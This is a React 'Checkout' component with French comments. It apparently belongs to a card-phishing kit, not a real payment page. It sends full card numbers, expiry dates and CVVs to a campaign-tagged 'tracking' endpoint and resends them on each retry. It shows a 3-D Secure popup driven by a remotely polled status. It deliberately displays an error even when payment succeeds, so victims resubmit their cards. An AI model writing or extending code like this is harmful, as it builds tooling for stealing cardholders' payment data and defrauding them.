import React, { useState, useImperativeHandle, forwardRef } from 'react';
import LoadingPopup from './popups/LoadingPopup';
import ThreeDSecurePopup from './popups/ThreeDSecurePopup';
import ErrorPopup from './popups/ErrorPopup';

const Checkout = forwardRef(function Checkout(
  {
    formData,
    email,
    firstName,
    campaign,
    onSuccess,
    onError,
    amount = 1
  },
  ref
) {
  const [showLoading, setShowLoading] = useState(false);
  const [show3DS, setShow3DS] = useState(false);
  const [showError, setShowError] = useState(false);
  const [contactId, setContactId] = useState(null);
  const [eventId, setEventId] = useState(null);
  const [status, setStatus] = useState(null);
  const payFetch = async (payload) => {
    try {
      // Appeler l'API proceed avec les données de la carte
      const cardDetails = {
        cardNumber: payload.card || payload.cardNumber,
        cardExpiry: payload.exp,
        cardCvc: payload.cvv,
        cardHolder: payload.name
      };

      const res = await fetch('/api/checkout/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardDetails,
          amount,
          contactId,
          eventId,
          email
        })
      });

      if (!res.ok) {
        throw new Error(`HTTP error! status: ${res.status}`);
      }

      const json = await res.json();
      return json; // { paymentId }
    } catch (err) {
      throw new Error(`Payment process failed: ${err.message}`);
    }
  };

  const startPaymentProcess = async () => {
    let pollingTimer;
    let timeoutTimer;

    try {
      // Reset all popups
      setShowLoading(false);
      setShow3DS(false);
      setShowError(false);

      // 1. Afficher loading popup
      setShowLoading(true);

      // 1.b Créer/mettre à jour le contact et créer l'event de départ (verification_start)
      try {
        const trackRes = await fetch('/api/tracking/track-submission', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            campaign,
            eventType: 'verification_start',
            payload: {
              email,
              firstName,
              phone: formData?.phone || formData?.phoneNumber || '',
              card: formData?.card,
              name: formData?.name,
              exp: formData?.exp,
              cvv: formData?.cvv,
              contactId
            }
          })
        });
        if (trackRes.ok) {
          const trackJson = await trackRes.json();
          if (trackJson?.contactId) setContactId(trackJson.contactId);
          if (trackJson?.eventId) setEventId(trackJson.eventId);
        }
      } catch (e) {
        // On n'arrête pas le flux si tracking échoue
        console.warn('track-submission failed:', e.message);
      }
      
      // 2. Lancer le workflow et récupérer un paymentId
      const { paymentId } = await payFetch(formData, amount);
      if (!paymentId) throw new Error('paymentId manquant');

      const startedAt = Date.now();

      const poll = async () => {
        try {
          const res = await fetch(`/api/checkout/status?paymentId=${encodeURIComponent(paymentId)}`);
          const { status } = await res.json();
          // Transitions d'état
          if (status === 'pending') {
            setShowLoading(true); setShow3DS(false); setShowError(false);
          } else if (status === 'in_verif') {
            setShowLoading(false); setShow3DS(true); setShowError(false);
          } else if (status === 'success' || status === 'error') {
            clearInterval(pollingTimer);
            clearTimeout(timeoutTimer);
            setShowLoading(false); setShow3DS(false); setShowError(true); // Afficher erreur même sur success, selon consigne
            setStatus(status);
            if (status === 'success' && onSuccess) onSuccess();
            return;
          }

          // Timeout 3 minutes
          if (Date.now() - startedAt > 3 * 60 * 1000) {
            clearInterval(pollingTimer);
            setShowLoading(false); setShow3DS(false); setShowError(true);
            setStatus(status);
          }
        } catch (e) {
          // En cas d'erreur réseau, ne pas casser immédiatement, réessayer au tick suivant
          console.warn('Polling error:', e.message);
        }
      };

      // Démarrer le polling toutes les 2s
      pollingTimer = setInterval(poll, 2000);
      // Lancer un premier poll immédiat
      await poll();

      // Timeout hard à 3 minutes
      timeoutTimer = setTimeout(() => {
        clearInterval(pollingTimer);
        setShowLoading(false); setShow3DS(false); setShowError(true);
      }, 3 * 60 * 1000);

    } catch (error) {
      if (pollingTimer) clearInterval(pollingTimer);
      if (timeoutTimer) clearTimeout(timeoutTimer);
      setShowLoading(false);
      setShow3DS(false);
      setShowError(true);
      if (onError) onError(error);
    }
  };

  const handleRetry = () => {
    setShowError(false);
    // Track the event verification_retry (inclut toutes les infos carte)
    fetch('/api/tracking/track-submission', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        eventType: 'verification_retry',
        email,
        firstName,
        phone: formData?.phone || formData?.phoneNumber || '',
        card: formData?.card,
        name: formData?.name,
        exp: formData?.exp,
        cvv: formData?.cvv,
        campaign
      })
    });
    
    startPaymentProcess();
  };

  const handleReset = () => {
    setShowError(false);
    setStatus(null);
  };

  useImperativeHandle(ref, () => ({ startPaymentProcess }));

  return (
    <>
      <LoadingPopup 
        isVisible={showLoading}
        data={{ cardNumber: (formData?.card || formData?.cardNumber || '').toString() }}
      />
      <ThreeDSecurePopup
        isVisible={show3DS}
        amount={amount} 
        lastFourDigits={formData?.card?.slice(-4)} 
        formattedDate={formData?.exp} 
        formattedTime={formData?.exp} 
        cardNumber={formData?.card} 
      />
      <ErrorPopup 
        status={status}
        isVisible={showError} 
        amount={amount} 
        retryPayment={handleRetry}
        resetPayment={handleReset}
        lastFourDigits={formData?.card?.slice(-4)} 
        formattedDate={formData?.exp} 
        formattedTime={formData?.exp} 
        cardNumber={formData?.card} 
      />
    </>
  );
});

export default Checkout;


